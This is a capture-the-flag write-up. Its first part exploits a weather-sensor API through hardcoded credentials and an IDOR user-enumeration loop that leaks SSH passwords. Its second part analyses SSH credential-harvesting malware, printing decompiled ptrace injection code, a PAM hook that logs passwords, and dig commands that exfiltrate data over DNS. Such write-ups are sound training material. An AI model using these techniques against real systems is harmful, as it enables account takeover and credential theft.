# Summary

Operator0 was a medium difficulty two-stage challenge. The first stage involved abusing three main web misconfigurations and chaining them together to leak SSH credentials. 

The second stage involved using the leaked SSH credentials to pivot to a Raspberry Pi. The goal was to investigate a credential harvesting malware that was performing process injection in the SSH service to steal credentials and exfiltrate them to a remote server via DNS requests.

# Stage 1 - Web Exploitation

Upon visiting the web application, you will realize that the application appears to gather weather sensors data and displays it on a web page.
It collects metrics such as temperature, humidity, windspeed, pressure and displays them in a beautiful interface.

![alt text](image.png)

## Enumeration

### robots.txt and banner grabbing

```bash
pico@ph0wn:~$ curl  http://34.155.206.38:9001/robots.txt

User-agent: *
Disallow: /docs
Disallow: /redoc
```

When visiting the /docs and /redoc directories, we can see that the web application exposed a **swagger** UI.
From the banner grabbing, we know that the api server is built using **FastAPI** and the documentation is generated by Swagger.

```bash
pico@ph0wn:~$ curl  http://34.155.206.38:9001/docs

    <!DOCTYPE html>
    <html>
    <head>
    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui.css">
    <link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png">
    <title>FastAPI - Swagger UI</title>

```

#### API Endpoints enumeration

By visiting the API specifications, we can see that the application offers: 6 main endpoints. 
```bash
pico@ph0wn:~$ curl -s http://34.155.206.38:9001/openapi.json | jq .paths | jq 'keys'
[
  "/",
  "/me",
  "/robots.txt",
  "/sensors",
  "/token",
  "/users/{userId}"
]
```
A look at the specification will reveal that there are 3 main endpoints that appear interesting but they all require OAUTH authentication: 


- **/me** : this endpoint is used to get the current user information and return a data model named **User**

```json
 "/me": {                                                                                                                                                                             
    "get": {                                                                                                                                                                           
      "summary": "Read Users Me",                                                                                                                                                      
      "operationId": "read_users_me_me_get",                                                                                                                                           
      "responses": {                                                                                                                                                                   
        "200": {                                                                                                                                                                       
          "description": "Successful Response",                                                                                                                                        
          "content": {                                                                                                                                                                 
            "application/json": {                                                                                                                                                      
              "schema": {                                                                                                                                                              
                "$ref": "#/components/schemas/User"                                                                                                                                    
              }                                                                                                                                                                        
            }                                                                                                                                                                          
          }                                                                                                                                                                            
        } 
      },        
      "security": [                         
        {             
          "OAuth2PasswordBearer": []
        }                
      ]                                                                                    
    }          
  }
```
- **/users/{userId}** : this endpoint is used to get the user information by providing an **integer userId** and return a data model named **UserInDB**

```json
"/users/{userId}": {
    "get": {
      "summary": "Read User",
      "operationId": "read_user_users__userId__get",
      "security": [
        {      
          "OAuth2PasswordBearer": []
        }                            
      ],                                                                                   
      "parameters": [
        {       
          "name": "userId",
          "in": "path",
          "required": true,
          "schema": {
            "type": "integer",
            "title": "Userid"
          }
        }
      ],
      "responses": {
        "200": {
          "description": "Successful Response",
          "content": {
            "application/json": {
              "schema": {
                "$ref": "#/components/schemas/UserInDB"
              }
            }
          }
        },
        "422": {
          "description": "Validation Error",
          "content": {
            "application/json": {
              "schema": {
                "$ref": "#/components/schemas/HTTPValidationError"
              }
            }
          }
        }
      }
    }
```
the data model **User** and **UserInDB** data models are definitely interesting as they appear to be related to user authentication and authorization.
But first we need to find a way to either bypass the OAUTH authentication or find a way to get a valid token/credentials.

### Source code analysis

Checking the main page **/**, we can notice that the web application is making AJAX requests to **/sensors** endpoint  

![alt text](image-1.png)

The initiator of the request is ***sensorsData.js*** and surprisingly enough, a bearer token is being sent in the request headers which is surprising because we haven't authenticated yet.
So by checking the source code of the ***/static/scripts/sensorsData.js*** file:
    
    
```javascript   
    const authEndPoint = '/token';
    const sensorEndPoint = '/sensors';
    const credentials = { username: 'ph0wn', password: 'ph0wn'}; 
    [...SNIP...]
    async function getJwtToken(authUrl, credentials) {
    try {
        const response = await fetch(authUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams(credentials)
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        const data = await response.json();
        return data.access_token; 
    } catch (error) {
        console.error('Error:', error);
    }
    }
    [...SNIP...]
```
We can see that the web application is sending a POST request to the **/token** endpoint with a **username** and **password** in the body of the request and the response is a **JWT token** that is being used in the **/sensors** request headers.

### Exploitation

Now that we have the credentials, we can use them to request a valid JWT token and enumerate the endpoint **/me** and **/users/{userId}** to get the user information.
1. get the JWT token
```bash
pico@ph0wn:~$ curl -s  -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=ph0wn&password=ph0wn' http://34.155.206.38:9001/token | jq

{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJwaDB3biIsImV4cCI6MTczMjE0MjIzMX0.nJ4e0W-DsoYcJ_6GNSzIb0t8DqVHg0p0HGr6xN9XAIc",
  "token_type": "bearer"
}
```

2. check the **/me** endpoint 

```bash
pico@ph0wn:~$ curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJwaDB3biIsImV4cCI6MTczMjE0MjIzMX0.nJ4e0W-DsoYcJ_6GNSzIb0t8DqVHg0p0HGr6xN9XAIc' http://34.155.206.38:9001/me | jq
{
  "id": 0,
  "username": "ph0wn",
  "plain_password": "ph0wn",
  "accessrole": "gui only",
  "disabled": false
}
```
The data model **User** returned by the **/me** endpoint contains the **username** and **plain_password** which is interesting because it means that the password is stored in plain text. However, our current user has the **accessrole** set to **gui only** which means that we might not have access to the **/users/{userId}** endpoint - or do we?

3. Checking the **/users/{userId}** endpoint 

First, let's check with the current user id **0**:
```bash
pico@ph0wn:~$ curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJwaDB3biIsImV4cCI6MTczMjE0MjIzMX0.nJ4e0W-DsoYcJ_6GNSzIb0t8DqVHg0p0HGr6xN9XAIc' http://34.155.206.38:9001/users/0 | jq
{
  "id": 0,
  "username": "ph0wn",
  "plain_password": "ph0wn",
  "accessrole": "gui only",
  "disabled": false,
  "notices": "Welcome to Operator0 challenge!"
}
```
The **UserInDB** data model appears to be returning the same information as the model **User** plus an additional field **notices** that contains a welcome message.
But what if we try to enumerate the **/users/{userId}** endpoint with a different user id?

```bash
pico@ph0wn:~$ curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJwaDB3biIsImV4cCI6MTczMjE0MjIzMX0.nJ4e0W-DsoYcJ_6GNSzIb0t8DqVHg0p0HGr6xN9XAIc' http://34.155.206.38:9001/users/1 | jq
{
  "id": 1,
  "username": "jack",
  "plain_password": "",
  "accessrole": "gui",
  "disabled": true,
  "notices": ""
}
```
We can clearly see that even with our current user having the accessrole set to **gui only**, we can still enumerate any user we want by providing the user id in the endpoint.
In this case, the user **jack** account is disabled and has no password set. Now we can proceed to enumerate users and find valid user accounts that are not disabled.

4. Dumping the users by ID and leaking credentials

So far the IDs are integers that are very predictable and we can first try to dump the users that are in the range of 0 to 1000 and see if we can find any valid credentials.

```bash
pico@ph0wn:~$ for i in {0..1000}; do curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJwaDB3biIsImV4cCI6MTczMjE0MjIzMX0.nJ4e0W-DsoYcJ_6GNSzIb0t8DqVHg0p0HGr6xN9XAIc' http://34.155.206.38:9001/users/$i| tee -a userDump.log; done;
```
This command will dump the users' information in a file named **userDump.log**. Thanks to jq, we can then filter the users that have a password set and are not disabled:

```bash
pico@ph0wn:~$ cat userDump.log | jq -r 'select(.plain_password != "" and .disabled == false)'
{
  "id": 0,
  "username": "ph0wn",
  "plain_password": "ph0wn",
  "accessrole": "gui only",
  "disabled": false,
  "notices": "Welcome to Operator0 challenge!"
}
{
  "id": 11,
  "username": "adminCroco",
  "plain_password": "kuroiCrocodile24#",
  "accessrole": "gui+ssh",
  "disabled": false,
  "notices": "Hi kuroiPico, welcome to the team! You can log in to the host '192.16.X.X' via SSH on port 22. After your first login, please remember to change your password."
}
```

And we can see that the user **adminCroco** has a password set and is not disabled.
Additionally, from the accessrole and the notices, we can see that the user has the **gui+ssh** accessrole and that we can log in to the host **192.16.X.X** via SSH on port 22.

### Getting the flag

```bash
pico@ph0wn:~$ sshpass -p 'kuroiCrocodile24#' ssh -p 9002 adminCroco@34.155.206.38


 ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓████████▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░                                                                                                                                                                                                                             

There is a creature lurking in the secret shadows of your encrypted SSH network traffic.
It is the Kuroi Crocodile. Beware of its presence.

To get the flag, you must look for a suspicious process running in the background,
retrieve it, analyze it, and get the key.

Once you are done analyzing the curious specimen, tune in carefully to its whispers over the network—
listening closely will unveil the secret message.

I have a feeling that monitoring recent file changes when an SSH connection is established
will help you in your endeavor.

Good luck.

ph0wn{stage1_picoAndAPIs_are_not_a_goodmatch?!}

```
By logging in, you will be greeted by the stage 1 flag `ph0wn{stage1_picoAndAPIs_are_not_a_goodmatch?!}` and hints for stage 2.

# Stage 2 - Raspberry Pi Credential Harvesting Malware Investigation

To make the investigation easier, the SSH banner greets you with three main hints that will help you solve the challenge.

As a summary, we can deduce from the hints that:
- There is a process spying on SSH traffic 
- To get the flag, we need to find, retrieve and analyze it
- Finally, we might need to monitor network traffic to get a secret message

As stated in the hints, a good starting point would be to monitor file changes when an SSH connection is established.

## Enumeration - Malware Sample 1

If you are not familiar with Linux filesystem events, you can use **pspy** to monitor the filesystem events and add **linpeas** to the mix to get more information about the system.
The system has Go already installed, which you can use to compile and run the pspy64 binary.
For this writeup, we will proceed with a manual enumeration approach.

### Process Enumeration
```bash
adminCroco@operator0:~ $ ps aux 
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND

[..SNIP..]
root       37850  0.0  0.1   2200  1152 ?        S    10:22   0:00 /bin/npt 701
[..SNIP..]
```

We can notice that there is a suspicious process **/bin/npt** running as root and it appears that the process is taking an argument **701**.
For the keen eye, you might have noticed the wordplay **npt** which is different from the network time protocol process **ntpd**.
Adding a quick check on when the binary was last modified, we can see that the binary was compiled recently on **Nov 24 10:28**:

```bash
adminCroco@operator0:~ $ ls -lat /bin
lrwxrwxrwx 1 root root 7 Jul  4 01:04 /bin -> usr/bin
adminCroco@operator0:~ $ ls -lat /usr/bin/
total 279688
drwxr-xr-x  2 root root       36864 Nov 24 10:28  .
-rwxr-xr-x  1 root root       82776 Nov 24 10:28  npt
-rwxr-xr-x  1 root root      199248 Jul 27 04:13  dig
[..SNIP..]
```

As stated in the hint, we can assume that the binary spying on the SSH traffic might be the **/bin/npt** process.
To confirm our assumption, we can download the binary and statically analyze it.

### File Transfer

**Note:** Transferring the file /bin/npt through **SCP** will not work because of the process injection technique used by the malware.
For this challenge, we will use **ncat** as it is already installed on the system.

1. Start a netcat listener on port 9001 and redirect the input to the /bin/npt file
```bash
adminCroco@operator0:~ $ nc -N -lvnp 9001 < /bin/npt 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

2. Get the binary from the netcat listener and save it as /tmp/npt
```bash
pico@ph0wn:/tmp$ nc 192.168.1.72 9001 > npt
```

After transferring the binary, we can check the file integrity to make sure the file is not corrupted before beginning the analysis.

```bash
pico@ph0wn:/tmp$ md5sum npt
dbd7ee3cd31336db0386004c128ba28a  npt

adminCroco@operator0:~ $ md5sum /bin/npt
dbd7ee3cd31336db0386004c128ba28a  /bin/npt
```

### Static Analysis

```bash
pico@ph0wn:/tmp$ file npt
npt: ELF 64-bit LSB pie executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, BuildID[sha1]=ffe7f6c5408353d3de5290fd5403e0dc3d8f3355, for GNU/Linux 3.7.0, with debug_info, not stripped
```

The binary is an **ELF** executable for **ARM64** and is not stripped, which makes it easier to analyze.
You can load the sample in your favorite disassembler and start the analysis.
For this writeup, we will use **Ghidra** to analyze the sample.

![alt text](image-2.png)

![alt text](image-3.png)

By examining the functions, we can see that the binary has multiple interesting functions that appear to be related to process injection, which confirms our assumption.

### **main** function
The main function takes an argument which is the process ID of the target process to inject the shellcode into.

### **WaitforLibPAM** Function Analysis
This function implements a process injection technique that:

1. **Process Attachment**
```c
iVar1 = ptrace_attach(target_pid);
```
- Attaches to target process using ptrace
- If attachment fails, returns -1

2. **Syscall Monitoring**
```c
// Constructs string "login.defs" character by character
libsystemd[0] = 'l';
libsystemd[1] = 'o';
// ... etc

// Enters monitoring loop
do {
    // Wait for syscalls
    ptrace(PTRACE_SYSCALL, target_pid, 0, 0);
    waitpid(target_pid, 0, 2);
    
    // Get registers
    ptrace_getregs(target_pid, &regs);
    
    // Check if syscall is openat (regs[7] == 1 && regs[8] == 0x38)
} while ((regs.regs[7] != 1) || (regs.regs[8] != 0x38));
```
- Monitors syscalls until it finds an `openat` syscall
- Specifically looking for when "login.defs" is being opened

3. **Shellcode Injection**
```c
// Once login.defs is found:
Inject_Shellcode(target_pid);
```
- When the target file is opened, injects shellcode into the process
- Waits for child process to end


4. Summary **Key Indicators:**

The function waits for PAM (Pluggable Authentication Modules) activity, specifically watching for when "login.defs" is accessed during SSH authentication, before injecting its payload.

### **Inject_Shellcode** Function Analysis

![alt text](image-4.png)

As you will notice in the image above, the shellcode is loaded by reading a variable **evilSoPath** and according to Ghidra, the variable value is set to **/tmp/payload.so**. This approach is quite unconventional and it is a good indicator that our next stage malware is located in **/tmp/**.
After loading the payload.so, it will be executed.

## Enumeration - Malware Sample 2

From our previous analysis, we have identified how the malware is "spying" on the SSH traffic and our investigation led us to the **/tmp/** directory,
which might contain the payload used by our malware.

### File Enumeration

```bash
total 76
-rw-r--r--  1 root root   116 Nov 24 13:57 .secrets.txt
drwxrwxrwt 12 root root  4096 Nov 24 13:27 .
-rwxr-xr-x  1 root root 71560 Nov 24 10:28 payload.so
drwxr-xr-x 18 root root  4096 Jul  4 01:17 ..
[..SNIP..]
```

We can see that there is a file named **payload.so** in the **/tmp/** directory which is the same file name as the one we identified in the previous analysis.
Additionally, there is a file named **.secrets.txt**.

```bash
adminCroco@operator0:/tmp $ cat .secrets.txt 
new delicious cred username is : adminCroco    password is: kuroiCrocodile24#
to get the flag, you must dig deeper!
```
From the file changes and our previous analysis, we can conclude that the file **.secrets.txt** is created by the payload.so and contains the credentials used by users when they log in to the system via SSH.

### File Transfer

```bash
adminCroco@operator0:/tmp $ nc -lvnp 9001 < payload.so 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 192.168.1.230.
Ncat: Connection from 192.168.1.230:62287.

pico@ph0wn:/tmp$ nc -nvv 192.168.1.72 9001 > payload.so
Connection to 192.168.1.72 9001 port [tcp/*] succeeded!
^C

adminCroco@operator0:/tmp $ md5sum payload.so 
6372a588f22fcb2ce6a07bfaa61cb9cc  payload.so

pico@ph0wn:/tmp$ md5sum payload.so 
6372a588f22fcb2ce6a07bfaa61cb9cc  payload.so
```

After transferring the file and verifying its integrity, we can start the analysis of the payload.so and understand how the file .secrets.txt is created.

### Payload.so Analysis

![alt text](image-5.png)

There are 3 main functions that appear to be the most interesting for our analysis:

- **my_pam_set_data**
- **sendPh0wnFlag**
- **base64DecryptFlagAttempt**

#### **my_pam_set_data**

```c

void my_pam_set_data(undefined8 *param_1,char *param_2,int *param_3,undefined8 param_4)
{
  char *pcVar1;
  char acStack_430 [1024];
  FILE *local_10;
  [..SNIP..]
  if (pcVar1 != (char *)0x0) {
    if (SEND_MODE == 0) {
      local_10 = (FILE *)0x0;
      local_10 = fopen(SEND_TARGET,"w");
      local_14 = *param_3;
      if (local_14 == 0) {
        fprintf(local_10,"new delicious cred username is : %s    password is: %s\n",
                (char *)param_1[6],(char *)*param_1);
        fwrite("to get the flag, you must dig deeper!\n",1,0x26,local_10);
        sendPhownFlag();
        base64DecryptFlagAttempt
                  ("AAAAAABJXzoCVRsCBgARXwdDOnsQFRQ3WEMYV2s6",
                   "A1YWPhUwHwAqVQ04EBsEWVwSMVNEPwJVEwIcEg==");
      }
      fclose(local_10);
    }
    [..SNIP..]
  return;
}

```
as you will notice, every time a user login to the system, the **my_pam_set_data** function is called and it will create the **.secrets.txt** file with the credentials of the user. additionally, the function sendPhownFlag and base64DecryptFlagAttempt are called.

#### **sendPh0wnFlag**

```c
int sendPhownFlag(void)

{
  int iVar1;
  
  printf("%c\n",'p');
  system("dig +short -t srv AAAAAABJXzoCVRsCBgARXwdDOnsQFRQ3WEMYV2s6.operator0.ph0wn.local");
  iVar1 = system("dig +short -t srv A1YWPhUwHwAqVQ04EBsEWVwSMVNEPwJVEwIcEg==.operator0.ph0wn.local")
  ;
  return iVar1;
}
```
this function appears to be used for the exfiltration of data via DNS. we can confirm that by checking the network traffic.
- step 1: start a tcpdump listener on port 53
```bash
tcpdump  port 53
```
- step 2: start a ssh session to the system and wait for the credentials to be exfiltrated
```bash
sshpass -p 'kuroiCrocodile24#' ssh  adminCroco@192.168.1.72
```
- step 3: check the tcpdump output

```bash

adminCroco@operator0:/tmp $ tcpdump port 53
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on wlan0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
16:29:41.277119 IP operator0.60849 > GEN8.domain: 12235+ [1au] SRV? AAAAAABJXzoCVRsCBgARXwdDOnsQFRQ3WEMYV2s6.operator0.ph0wn.local. (103)
16:29:41.298476 IP GEN8.domain > operator0.60849: 12235 NXDomain 0/1/1 (166)
16:29:41.362794 IP operator0.60808 > GEN8.domain: 44694+ [1au] SRV? A1YWPhUwHwAqVQ04EBsEWVwSMVNEPwJVEwIcEg==.operator0.ph0wn.local. (103)
[..SNIP..]

```

the DNS requests are being sent to the **operator0.ph0wn.local** domain and the requests are being sent to the **AAAAAABJXzoCVRsCBgARXwdDOnsQFRQ3WEMYV2s6** and **A1YWPhUwHwAqVQ04EBsEWVwSMVNEPwJVEwIcEg==** subdomains.
the subdomains does not exist at all, having such behavior is a strong indicator that data is being exfiltrated via DNS.
trying to decode the base64 string **AAAAAABJXzoCVRsCBgARXwdDOnsQFRQ3WEMYV2s6** and **A1YWPhUwHwAqVQ04EBsEWVwSMVNEPwJVEwIcEg==** will return gibberish characters.

moving on to the next function **base64DecryptFlagAttempt**

#### **base64DecryptFlagAttempt**

```c
void base64DecryptFlagAttempt(char *param_1,char *param_2)
{
  byte bVar1;
  ulong uVar2;
  size_t sVar3;
  size_t sVar4;
  char *__dest;
  int local_4;
  
  sVar3 = strlen(param_1);
  sVar4 = strlen(param_2);
  __dest = (char *)malloc(sVar3 + sVar4 + 1);
  strcpy(__dest,param_1);
  strcat(__dest,param_2);
  for (local_4 = 0; sVar3 = strlen(__dest), (ulong)(long)local_4 < sVar3; local_4 = local_4 + 1) {
    bVar1 = __dest[local_4];
    sVar3 = strlen("ph0wn24Operator0X0RKey");
    uVar2 = 0;
    if (sVar3 != 0) {
      uVar2 = (ulong)(long)local_4 / sVar3;
    }
    __dest[local_4] = bVar1 ^ "ph0wn24Operator0X0RKey"[(long)local_4 - uVar2 * sVar3];
  }
  return;
}
```

It appears that the function is trying to decrypt the flag by first concatenating the two strings and then performing a XOR operation with the key **ph0wn24Operator0X0RKey**.

With this information, we can head to CyberChef and try to decrypt the flag:
```
AAAAAABJXzoCVRsCBgARXwdDOnsQFRQ3WEMYV2s6
A1YWPhUwHwAqVQ04EBsEWVwSMVNEPwJVEwIcEg==
```

[Decrypt Recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'UTF8','string':'ph0wn24Operator0X0RKey'%7D,'Standard',false)&input=QUFBQUFBQkpYem9DVlJzQ0JnQVJYd2RET25zUUZSUTNXRU1ZVjJzNkExWVdQaFV3SHdBcVZRMDRFQnNFV1Z3U01WTkVQd0pWRXdJY0VnPT0) 

![alt text](image-6.png)

Kuroi crocodile has been defeated! And we got the flag **`ph0wn{kur0icroco_sh0uld_h4ve_us3d_a_m0re_subt1le_appr0ach}`**